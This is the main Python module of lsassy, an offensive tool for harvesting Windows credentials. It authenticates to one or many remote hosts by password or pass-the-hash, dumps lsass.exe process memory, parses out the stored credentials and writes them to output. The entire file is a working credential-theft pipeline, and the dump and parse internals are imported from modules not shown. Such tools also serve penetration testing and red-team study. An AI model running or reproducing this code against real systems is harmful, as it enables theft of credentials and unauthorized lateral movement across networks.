#!/usr/bin/env python3
# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from multiprocessing import Process, RLock

from lsassy.modules.dumper import Dumper
from lsassy.modules.impacketconnection import ImpacketConnection
from lsassy.modules.logger import Logger
from lsassy.modules.parser import Parser
from lsassy.modules.writer import Writer
from lsassy.utils.utils import *

lock = RLock()


class Lsassy:
    def __init__(self,
                 hostname, username, domain="", password="", lmhash="", nthash="",
                 log_options=Logger.Options(),
                 dump_options=Dumper.Options(),
                 parse_options=Parser.Options(),
                 write_options=Writer.Options()
                 ):

        self.conn_options = ImpacketConnection.Options(hostname, domain, username, password, lmhash, nthash)
        self.log_options = log_options
        self.dump_options = dump_options
        self.parse_options = parse_options
        self.write_options = write_options

        self._target = hostname

        self._log = Logger(self._target, log_options)

        self._conn = None
        self._dumper = None
        self._parser = None
        self._dumpfile = None
        self._credentials = []
        self._writer = None

    def connect(self, options: ImpacketConnection.Options):
        self._conn = ImpacketConnection(options)
        self._conn.set_logger(self._log)

        try:
            self._conn.login()
        except Exception:
            self._log.error("An error occurred while login")
            raise

        self._log.info("Authenticated")
        return ERROR_SUCCESS

    def dump_lsass(self, options=Dumper.Options()):
        if not self._conn.isadmin():
            self._conn.close()
            return False

        self._dumper = Dumper(self._conn, options)
        try:
            self._dumper.dump()
        except Exception:
            self._log.error("An error occurred while dumping lsass")
            raise

        self._dumpfile = self._dumper.getfile()

        self._log.success("Process lsass.exe has been dumped")
        return ERROR_SUCCESS

    def parse_lsass(self, options=Dumper.Options()):
        self._parser = Parser(self._dumpfile, options)
        try:
            self._parser.parse()
        except Exception:
            self._log.error("An error occurred while parsing lsass dump")
            raise

        self._credentials = self._parser.get_credentials()
        self._log.success("Process lsass.exe has been parsed")
        return ERROR_SUCCESS

    def write_credentials(self, options=Writer.Options()):
        self._writer = Writer(self._target, self._credentials, self._log, options)
        try:
            self._writer.write()
        except Exception:
            self._log.error("An error occurred while writing credentials")
            raise

        return ERROR_SUCCESS

    def clean(self):
        if self._parser:
            try:
                self._parser.clean()
            except Exception:
                self._log.warn("An error occurred while cleaning parser")

        if self._dumper:
            try:
                self._dumper.clean()
            except Exception:
                self._log.warn("An error occurred while cleaning dumper")

        if self._conn:
            try:
                self._conn.clean()
            except Exception:
                self._log.warn("An error occurred while cleaning connection")

        self._log.info("Cleaning complete")

    def get_credentials(self):
        self.log_options.quiet = True
        self.log_options.verbosity = False
        self._log = Logger(self._target, self.log_options)
        self.write_options.format = "none"
        return_code = self.run()
        ret = {
                "success": True,
                "credentials": self._credentials
            }
        if not return_code:
            ret["success"] = False
            ret["error_code"] = return_code.error_code
            ret["error_msg"] = return_code.error_msg

        return ret

    def run(self):
        try:
            self._run()
        except KeyboardInterrupt:
            print("")
            self._log.warn("Quitting gracefully...")
            self.clean()
            return ERROR_USER_INTERRUPTION
        except Exception:
            self.clean()
            raise
        self.clean()
        return ERROR_SUCCESS

    def _run(self):
        """
        Extract hashes from arguments
        """
        self.connect(self.conn_options)
        self.dump_lsass(self.dump_options)
        self.parse_lsass(self.parse_options)
        self.write_credentials(self.write_options)
        return ERROR_SUCCESS


class CLI:
    def __init__(self, target):
        self.conn_options = ImpacketConnection.Options()
        self.log_options = Logger.Options()
        self.dump_options = Dumper.Options()
        self.parse_options = Parser.Options()
        self.write_options = Writer.Options()
        self.lsassy = None
        self.target = target

    def set_options_from_args(self, args):
        # Logger Options
        self.log_options.verbosity = args.v
        self.log_options.quiet = args.quiet

        # Connection Options
        self.conn_options.hostname = self.target
        self.conn_options.domain_name = args.domain
        self.conn_options.username = args.username
        self.conn_options.password = args.password
        if not self.conn_options.password and args.hashes:
            if ":" in args.hashes:
                self.conn_options.lmhash, self.conn_options.nthash = args.hashes.split(":")
            else:
                self.conn_options.lmhash, self.conn_options.nthash = 'aad3b435b51404eeaad3b435b51404ee', args.hashes

        # Dumper Options
        self.dump_options.dumpname = args.dumpname
        self.dump_options.procdump_path = args.procdump
        self.dump_options.dumpert_path = args.dumpert
        self.dump_options.method = args.method
        self.dump_options.timeout = args.timeout

        # Parser Options
        self.parse_options.raw = args.raw

        # Writer Options
        self.write_options.output_file = args.outfile
        self.write_options.format = args.format

    def run(self):
        args = get_args()
        self.set_options_from_args(args)
        self.lsassy = Lsassy(
            self.conn_options.hostname,
            self.conn_options.username,
            self.conn_options.domain_name,
            self.conn_options.password,
            self.conn_options.lmhash,
            self.conn_options.nthash,
            self.log_options,
            self.dump_options,
            self.parse_options,
            self.write_options
        )
        try:
            self.lsassy.run()
        except:
            if args.v == 2:
                raise
            else:
                return ERROR_UNDEFINED
        return ERROR_SUCCESS


def run():
    targets = get_targets(get_args().target)

    if len(targets) == 1:
        return CLI(targets[0]).run()

    jobs = [Process(target=CLI(target).run) for target in targets]
    try:
        for job in jobs:
            job.start()
    except KeyboardInterrupt as e:
        print("\nQuitting gracefully...")
        terminate_jobs(jobs)
    finally:
        join_jobs(jobs)

    return 0


if __name__ == '__main__':
    run()
